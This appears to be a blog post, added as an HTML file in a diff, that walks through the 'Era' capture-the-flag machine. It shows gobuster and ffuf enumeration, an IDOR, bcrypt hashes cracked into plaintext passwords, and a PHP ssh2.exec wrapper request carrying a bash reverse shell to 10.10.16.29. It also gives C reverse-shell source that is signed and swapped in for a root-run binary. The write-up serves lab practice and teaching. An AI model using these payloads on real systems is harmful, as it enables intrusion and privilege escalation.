@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Linux - Medium - Era - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Linux - Medium - Era</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1753976906772"
+                  >2025-07-31 17:48</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1754052781480"
+                  >2025-08-01 14:53</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<p><img src="/_resources/7a25f15c7dde4b9eaff6764fe2d78f17.png" /></p>
+<p><img src="/_resources/d9303eef1a7f4ec8ab2381143174a7a1.png" /></p>
+<div><pre class="hljs"><code><span class="hljs-section">└──╼ $gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://era.htb  --append-domain -t 150
+===============================================================</span>
+Gobuster v3.6
+<span class="hljs-section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================</span>
+[+] Url:             http://era.htb
+[+] Method:          GET
+[+] Threads:         150
+[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: file.era.htb Status: 200 [Size: 6765]</code></pre></div>
+<p><img src="/_resources/a6cdbaefe9284a50b6558154c32583be.png" /></p>
+<p><img src="/_resources/261558baaada40c2a43dd8d042a67e85.png" /></p>
+<h1 id="file">file</h1>
+<p>When looking at the dirbuster, we can find register.php, which is not visible on the main site. We then get access to the management panel.</p>
+<p><img src="/_resources/a9d986aaf4d64d7c813ef5459b6bf50c.png" /></p>
+<p>In it, we can upload files. Doing so, gives us a download link with possible idor.</p>
+<p><img src="/_resources/28a75edb17ad410e803f1032f01f2551.png" /></p>
+<p>We can check random number and see that authentication for that user is not required.</p>
+<p><img src="/_resources/510ccee877284e99b30bf992c17a89be.png" /></p>
+<p>We can enumerate it using ffuf.</p>
+<div><pre class="hljs"><code><span class="hljs-string">ffuf</span> <span class="hljs-string">-w</span> <span class="hljs-string">numbers.txt:FUZZ</span> <span class="hljs-string">-u</span> <span class="hljs-string">http://file.era.htb/download.php?id=FUZZ</span> <span class="hljs-string">-b</span> <span class="hljs-string">"PHPSESSID=0gdg6cbtkrrcqb72sr386l3005"</span> <span class="hljs-string">-mc</span> <span class="hljs-number">200</span> <span class="hljs-string">-fr</span> <span class="hljs-string">"Not Found"</span>
+
+<span class="hljs-number">54</span>                      [<span class="hljs-attr">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">6378</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">2552</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">222</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-string">67ms</span>]
+<span class="hljs-number">150</span>                     [<span class="hljs-attr">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">6366</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">2552</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">222</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-string">38ms</span>]</code></pre></div>
+<p>This gives us two files, <code>signing.zip</code> and <code>site-backup-30-08-24.zip</code>. After extraction we get <code>filedb.sqlite</code>.</p>
+<p><img src="/_resources/80259d4cfcfd43459ced6330414cfb83.png" /></p>
+<p>We can crack them with <code>hashcat -m 3200 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt</code> and get</p>
+<div><pre class="hljs"><code><span class="hljs-variable">$2y</span><span class="hljs-variable">$10</span><span class="hljs-variable">$S9EOSDqF1RzNUvyVj7OtJ</span>.<span class="hljs-symbol">mskgP1spN3g2dneU.D.ABQLhSV2Qvxm:</span>america - eric
+<span class="hljs-variable">$2b</span><span class="hljs-variable">$12</span><span class="hljs-variable">$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2</span>.<span class="hljs-symbol">:mustang</span> - yuri</code></pre></div>
+<p>Using these findings, we can log in as yuri and reset admin_ef01cab31aa password using “Update Security Questions” feature.</p>
+<p><img src="/_resources/1f973860ed114f008b83dd3ca0fba711.png" /></p>
+<p><img src="/_resources/0c3b46c1d72a442cb67b68d062bdef22.png" /></p>
+<p><img src="/_resources/91b1590b4da54356a4e299272cb49511.png" /></p>
+<p>Looking back at the source code, we can find in download.php interesting comment.</p>
+<div><pre class="hljs"><code>    <span class="hljs-comment">// BETA (Currently only available to the admin) - Showcase file instead of downloading it</span>
+    } <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'show'</span>] === <span class="hljs-string">"true"</span> &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'erauser'</span>] === <span class="hljs-number">1</span>) {
+    		<span class="hljs-variable">$format</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'format'</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'format'</span>] : <span class="hljs-string">''</span>;
+    		<span class="hljs-variable">$file</span> = <span class="hljs-variable">$fetched</span>[<span class="hljs-number">0</span>];
+
+        <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$format</span>, <span class="hljs-string">'://'</span>) !== <span class="hljs-literal">false</span>) {
+        		<span class="hljs-variable">$wrapper</span> = <span class="hljs-variable">$format</span>;
+        		header(<span class="hljs-string">'Content-Type: application/octet-stream'</span>);
+    		} <span class="hljs-keyword">else</span> {
+        		<span class="hljs-variable">$wrapper</span> = <span class="hljs-string">''</span>;
+        		header(<span class="hljs-string">'Content-Type: text/html'</span>);
+    		}
+
+    		<span class="hljs-keyword">try</span> {
+        		<span class="hljs-variable">$file_content</span> = fopen(<span class="hljs-variable">$wrapper</span> ? <span class="hljs-variable">$wrapper</span> . <span class="hljs-variable">$file</span> : <span class="hljs-variable">$file</span>, <span class="hljs-string">'r'</span>);
+            <span class="hljs-variable">$full_path</span> = <span class="hljs-variable">$wrapper</span> ? <span class="hljs-variable">$wrapper</span> . <span class="hljs-variable">$file</span> : <span class="hljs-variable">$file</span>;
+            <span class="hljs-comment">// Debug Output</span>
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Opening: "</span> . <span class="hljs-variable">$full_path</span> . <span class="hljs-string">"\n"</span>;
+        		<span class="hljs-keyword">echo</span> <span class="hljs-variable">$file_content</span>;
+    		} <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) {
+        		<span class="hljs-keyword">echo</span> <span class="hljs-string">"Error reading file: "</span> . <span class="hljs-variable">$e</span>-&gt;getMessage();
+    		}</code></pre></div>
+<p>We can abuse it using ss2exec wrapper.</p>
+<div><pre class="hljs"><code><span class="hljs-attribute">GET</span> /download.php?id=<span class="hljs-number">54</span>&amp;show=true&amp;format=ssh2.exec%<span class="hljs-number">3</span>a%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>fyuri%<span class="hljs-number">3</span>amustang%<span class="hljs-number">40127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">2</span>fbash%<span class="hljs-number">20</span>-c%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>bash%<span class="hljs-number">20</span>-i%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>fdev%<span class="hljs-number">2</span>ftcp%<span class="hljs-number">2</span>f<span class="hljs-number">10.10.16.29</span>%<span class="hljs-number">2</span>f4444%<span class="hljs-number">200</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">261</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>a</code></pre></div>
+<p><img src="/_resources/7a6a93cdd917449f985eee4b72a4dd77.png" /></p>
+<p>We can then sign in as eric and get the user flag.</p>
+<p>Shell stabilisationfor Qol.</p>
+<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("bash")'</span>
+stty raw -<span class="hljs-built_in">echo</span> 
+^Z
+<span class="hljs-built_in">fg</span></code></pre></div>
+<h1 id="priv-esc">Priv esc</h1>
+<p>ps aux gets us</p>
+<div><pre class="hljs"><code><span class="hljs-attribute">root</span>       <span class="hljs-number">44149</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>   <span class="hljs-number">2892</span>   <span class="hljs-number">968</span> ?        Ss   <span class="hljs-number">11</span>:<span class="hljs-number">55</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /bin/sh -c bash -c '/root/initiate_monitoring.sh' &gt;&gt; /opt/AV/periodic-checks/status.log <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>
+<span class="hljs-attribute">root</span>       <span class="hljs-number">44150</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>   <span class="hljs-number">4784</span>  <span class="hljs-number">3292</span> ?        S    <span class="hljs-number">11</span>:<span class="hljs-number">55</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /bin/bash /root/initiate_monitoring.sh
+<span class="hljs-attribute">root</span>       <span class="hljs-number">44160</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>   <span class="hljs-number">2776</span>  <span class="hljs-number">1024</span> ?        S    <span class="hljs-number">11</span>:<span class="hljs-number">55</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /opt/AV/periodic-checks/monitor</code></pre></div>
+<p>We can check that devs can write to this file - and we are devs.</p>
+<div><pre class="hljs"><code>eric@era:<span class="hljs-regexp">/tmp$ ls -al /</span>opt<span class="hljs-regexp">/AV/</span>periodic-checks/monitor
+-rwxrw---- <span class="hljs-number">1</span> root devs <span class="hljs-number">16544</span> Aug  <span class="hljs-number">1</span> <span class="hljs-number">11</span>:<span class="hljs-number">57</span> <span class="hljs-regexp">/opt/</span>AV<span class="hljs-regexp">/periodic-checks/m</span>onitor
+eric@era:/tmp$ id
+uid=<span class="hljs-number">1000</span>(eric) gid=<span class="hljs-number">1000</span>(eric) groups=<span class="hljs-number">1000</span>(eric),<span class="hljs-number">1001</span>(devs)
+eric@era:<span class="hljs-regexp">/tmp$ file /</span>opt<span class="hljs-regexp">/AV/</span>periodic-checks/monitor
+<span class="hljs-regexp">/opt/</span>AV<span class="hljs-regexp">/periodic-checks/m</span>onitor: ELF <span class="hljs-number">64</span>-bit LSB pie executable, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter <span class="hljs-regexp">/lib64/</span>ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>, BuildID[sha1]=<span class="hljs-number">45</span>a4bb1db5df48dcc085cc062103da3761dd8eaf, <span class="hljs-keyword">for</span> GNU/Linux <span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>, not stripped</code></pre></div>
+<p>All that is left to create a simple revshell, sign it and wait for root.</p>
+<div><pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
+    <span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>); <span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);
+    <span class="hljs-built_in">execl</span>(<span class="hljs-string">"/bin/bash"</span>, <span class="hljs-string">"bash"</span>, <span class="hljs-string">"-c"</span>, <span class="hljs-string">"bash -i &gt;&amp; /dev/tcp/10.10.16.29/2137 0&gt;&amp;1"</span>, <span class="hljs-literal">NULL</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre></div>
+<p>x86_64-linux-gnu-gcc -o monitor reverse.c -static<br />
+./elf-sign sha256 key.pem key.pem monitor</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
